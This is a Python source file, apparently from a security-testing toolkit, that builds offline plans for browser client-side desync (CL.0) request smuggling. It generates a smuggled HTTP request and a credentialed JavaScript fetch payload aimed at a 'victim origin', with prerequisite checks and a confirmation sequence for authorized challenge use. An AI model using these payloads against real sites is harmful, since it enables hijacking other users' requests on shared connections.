#!/usr/bin/env python3
"""Offline client-side-desync (browser CL.0) planner.

The existing web engines cover server-side CL.0 and HTTP/2 downgrade shapes.
This module models the different browser-to-server case: a browser-compatible
``no-cors`` POST whose body can remain queued when an HTTP/1.1 endpoint sends an
early response without consuming that body.  It emits reference transcripts and
an inert JavaScript artifact; it never opens a socket, launches a browser, or
claims that a target is vulnerable.
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import urllib.parse
from dataclasses import asdict, dataclass
from typing import Mapping, Sequence


MAX_COMPONENT = 2048
MAX_MARKER = 64

FACT_NAMES: tuple[str, ...] = (
    "early_response_observed",
    "body_ignored_observed",
    "connection_keep_alive_observed",
    "http1_reuse_observed",
    "h2_unavailable",
    "browser_simple_post_possible",
    "credentialed_context_relevant",
)

_FACT_DESCRIPTIONS: dict[str, str] = {
    "early_response_observed": "the endpoint responds before the declared request body is consumed",
    "body_ignored_observed": "the endpoint treats the browser POST as bodyless (CL.0 behavior)",
    "connection_keep_alive_observed": "the server leaves the HTTP/1.1 connection reusable after its early response",
    "http1_reuse_observed": "the browser places a later request on that same HTTP/1.1 connection",
    "h2_unavailable": "the affected browser connection uses HTTP/1.1 rather than multiplexed HTTP/2 or HTTP/3",
    "browser_simple_post_possible": "the cross-origin request is a CORS-safelisted POST with no script-set forbidden headers",
    "credentialed_context_relevant": "the follow-up request uses the intended victim credential/connection partition",
}


class WebDepthCSDError(ValueError):
    """A CSD planning input is malformed, unsupported, or over a bound."""


@dataclass(frozen=True)
class CSDRequirement:
    name: str
    description: str
    state: str


@dataclass(frozen=True)
class CSDPlan:
    origin: str
    endpoint: str
    marker_path: str
    followup_path: str
    marker: str
    readiness: str
    requirements: tuple[CSDRequirement, ...]
    blockers: tuple[str, ...]
    unverified: tuple[str, ...]
    smuggled_body: str
    first_request_reference: str
    followup_request_reference: str
    browser_artifact: str
    confirmation_sequence: tuple[str, ...]
    false_positive_warning: str
    candidate_only: bool = True
    vulnerability_claimed: bool = False
    offline: bool = True
    network_requests: int = 0

    def as_dict(self) -> dict[str, object]:
        row = asdict(self)
        row["requirements"] = [asdict(item) for item in self.requirements]
        row["blockers"] = list(self.blockers)
        row["unverified"] = list(self.unverified)
        row["confirmation_sequence"] = list(self.confirmation_sequence)
        return row


def _text(value: object, label: str, maximum: int = MAX_COMPONENT) -> str:
    if not isinstance(value, str):
        raise WebDepthCSDError(f"{label} must be text")
    if not value or len(value) > maximum:
        raise WebDepthCSDError(f"{label} must contain 1..{maximum} characters")
    if any(ord(ch) < 0x20 or ord(ch) == 0x7F for ch in value):
        raise WebDepthCSDError(f"{label} contains a control character")
    return value


def _origin(value: object) -> tuple[str, str]:
    raw = _text(value, "origin")
    try:
        parsed = urllib.parse.urlsplit(raw)
        port = parsed.port
    except (TypeError, ValueError, UnicodeError) as exc:
        raise WebDepthCSDError("origin is not a valid HTTP origin") from exc
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise WebDepthCSDError("origin must use http or https and include a host")
    if parsed.username is not None or parsed.password is not None:
        raise WebDepthCSDError("origin must not contain user information")
    if parsed.path not in {"", "/"} or parsed.query or parsed.fragment:
        raise WebDepthCSDError("origin must not contain a path, query, or fragment")
    host = parsed.hostname
    if not re.fullmatch(r"(?:[A-Za-z0-9.-]{1,253}|[0-9A-Fa-f:]{2,45})", host):
        raise WebDepthCSDError("origin host has unsupported characters")
    authority_host = f"[{host}]" if ":" in host and not host.startswith("[") else host
    authority = authority_host if port is None else f"{authority_host}:{port}"
    canonical = f"{parsed.scheme}://{authority}"
    return canonical, authority


def _path(value: object, label: str) -> str:
    raw = _text(value, label)
    if not raw.startswith("/") or raw.startswith("//"):
        raise WebDepthCSDError(f"{label} must be an origin-form absolute path")
    if "#" in raw or any(ch.isspace() for ch in raw):
        raise WebDepthCSDError(f"{label} must not contain whitespace or a fragment")
    try:
        parsed = urllib.parse.urlsplit(raw)
    except (TypeError, ValueError, UnicodeError) as exc:
        raise WebDepthCSDError(f"{label} is malformed") from exc
    if parsed.scheme or parsed.netloc or parsed.fragment:
        raise WebDepthCSDError(f"{label} must be an origin-form path")
    try:
        raw.encode("ascii")
    except UnicodeEncodeError as exc:
        raise WebDepthCSDError(f"{label} must be ASCII; percent-encode non-ASCII bytes") from exc
    return raw


def _marker(value: object) -> str:
    raw = _text(value, "marker", MAX_MARKER)
    if not re.fullmatch(r"[A-Za-z][A-Za-z0-9_-]{2,63}", raw):
        raise WebDepthCSDError("marker must be a conservative 3..64 character token")
    return raw


def _facts(values: Mapping[str, bool | None] | None) -> dict[str, bool | None]:
    if values is None:
        return {name: None for name in FACT_NAMES}
    if not isinstance(values, Mapping):
        raise WebDepthCSDError("facts must be a mapping")
    unknown = sorted(set(values) - set(FACT_NAMES))
    if unknown:
        raise WebDepthCSDError(f"unknown fact(s): {', '.join(str(item) for item in unknown)}")
    result: dict[str, bool | None] = {}
    for name in FACT_NAMES:
        state = values.get(name)
        if state is not True and state is not False and state is not None:
            raise WebDepthCSDError(f"fact {name} must be true, false, or null")
        result[name] = state
    return result


def assess_csd_facts(values: Mapping[str, bool | None] | None = None) -> tuple[
    str, tuple[CSDRequirement, ...], tuple[str, ...], tuple[str, ...]
]:
    """Return a conservative readiness verdict for explicit CSD facts."""

    try:
        facts = _facts(values)
        requirements = tuple(
            CSDRequirement(
                name,
                _FACT_DESCRIPTIONS[name],
                "satisfied" if facts[name] is True else "blocked" if facts[name] is False else "unverified",
            )
            for name in FACT_NAMES
        )
        blockers = tuple(item.description for item in requirements if item.state == "blocked")
        unverified = tuple(item.description for item in requirements if item.state == "unverified")
        readiness = "blocked" if blockers else "unverified" if unverified else "preconditions_supported"
        return readiness, requirements, blockers, unverified
    except WebDepthCSDError:
        raise
    except Exception as exc:  # public fail-closed boundary
        raise WebDepthCSDError("could not assess CSD facts") from exc


def build_csd_plan(
    origin: str,
    endpoint: str,
    *,
    marker_path: str = "/__webdepth_csd_marker__",
    followup_path: str = "/__webdepth_csd_followup__",
    marker: str = "WEBDEPTH_CSD",
    facts: Mapping[str, bool | None] | None = None,
) -> CSDPlan:
    """Build one inert browser CL.0/client-side-desync plan.

    ``facts`` never causes probing.  A fully supported verdict means only that
    the caller supplied every prerequisite as observed; it is not a finding.
    """

    try:
        canonical_origin, authority = _origin(origin)
        endpoint_value = _path(endpoint, "endpoint")
        marker_path_value = _path(marker_path, "marker_path")
        followup_path_value = _path(followup_path, "followup_path")
        marker_value = _marker(marker)
        readiness, requirements, blockers, unverified = assess_csd_facts(facts)

        smuggled = (
            f"GET {marker_path_value} HTTP/1.1\r\n"
            f"Host: {authority}\r\n"
            f"X-WebDepth-CSD: {marker_value}\r\n"
            "Connection: keep-alive\r\n\r\n"
        )
        body_bytes = smuggled.encode("ascii")
        first = (
            f"POST {endpoint_value} HTTP/1.1\r\n"
            f"Host: {authority}\r\n"
            "Content-Type: text/plain;charset=UTF-8\r\n"
            f"Content-Length: {len(body_bytes)}\r\n"
            "Connection: keep-alive\r\n\r\n"
            f"{smuggled}"
        )
        followup = (
            f"GET {followup_path_value} HTTP/1.1\r\n"
            f"Host: {authority}\r\n"
            "Connection: keep-alive\r\n\r\n"
        )
        endpoint_url = canonical_origin + endpoint_value
        followup_url = canonical_origin + followup_path_value
        artifact = "\n".join((
            "// INERT REVIEW ARTIFACT: run only in an authorized challenge browser context.",
            "// JavaScript sets no Host, Content-Length, Connection, or other forbidden request header.",
            "(async () => {",
            f"  const queued = {json.dumps(smuggled)};",
            f"  await fetch({json.dumps(endpoint_url)}, {{",
            '    method: "POST", mode: "no-cors", credentials: "include",',
            '    headers: {"Content-Type": "text/plain;charset=UTF-8"}, body: queued',
            "  });",
            f"  await fetch({json.dumps(followup_url)}, {{mode: \"no-cors\", credentials: \"include\"}});",
            "})();",
        ))
        sequence = (
            "Establish a negative control showing an ordinary POST consumes its body and leaves no marker request.",
            "Confirm from saved server-side evidence that the candidate endpoint sends an early response without consuming the declared body.",
            "Confirm HTTP/1.1 keep-alive and same browser connection reuse; an early response alone is not a desync.",
            "Use the inert marker path and correlate the second request/response or server log entry without targeting another user.",
            "Only after independent confirmation, replace the inert marker with the assigned-challenge route and preserve an in-band evidence path.",
        )
        return CSDPlan(
            canonical_origin,
            endpoint_value,
            marker_path_value,
            followup_path_value,
            marker_value,
            readiness,
            requirements,
            blockers,
            unverified,
            smuggled,
            first,
            followup,
            artifact,
            sequence,
            "An early response or two ordinary pipelined responses does not prove CSD; proof requires body non-consumption and reuse of the poisoned HTTP/1.1 connection.",
        )
    except WebDepthCSDError:
        raise
    except Exception as exc:  # public fail-closed boundary
        raise WebDepthCSDError("could not build the CSD plan") from exc


def _fact_value(value: str) -> bool | None:
    return {"yes": True, "no": False, "unknown": None}[value]


def _parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Build an offline browser CL.0/CSD plan")
    parser.add_argument("origin", help="victim origin, for example https://target.invalid")
    parser.add_argument("endpoint", help="candidate body-ignoring POST path")
    parser.add_argument("--marker-path", default="/__webdepth_csd_marker__")
    parser.add_argument("--followup-path", default="/__webdepth_csd_followup__")
    parser.add_argument("--marker", default="WEBDEPTH_CSD")
    for name in FACT_NAMES:
        parser.add_argument("--" + name.replace("_", "-"), choices=("yes", "no", "unknown"), default="unknown")
    parser.add_argument("--json", action="store_true")
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    try:
        args = _parser().parse_args(list(argv) if argv is not None else None)
    except SystemExit as exc:
        return exc.code if isinstance(exc.code, int) else 2
    try:
        facts = {name: _fact_value(getattr(args, name)) for name in FACT_NAMES}
        plan = build_csd_plan(
            args.origin,
            args.endpoint,
            marker_path=args.marker_path,
            followup_path=args.followup_path,
            marker=args.marker,
            facts=facts,
        )
    except WebDepthCSDError as exc:
        print(f"webdepth_csd_planner: {exc}", file=sys.stderr)
        return 2
    if args.json:
        print(json.dumps(plan.as_dict(), indent=2, sort_keys=True))
    else:
        print(f"readiness: {plan.readiness}")
        print(plan.browser_artifact)
        if plan.blockers:
            print("blockers: " + "; ".join(plan.blockers))
        if plan.unverified:
            print("unverified: " + "; ".join(plan.unverified))
    return 0


__all__ = [
    "CSDPlan",
    "CSDRequirement",
    "FACT_NAMES",
    "WebDepthCSDError",
    "assess_csd_facts",
    "build_csd_plan",
    "main",
]


if __name__ == "__main__":
    raise SystemExit(main())
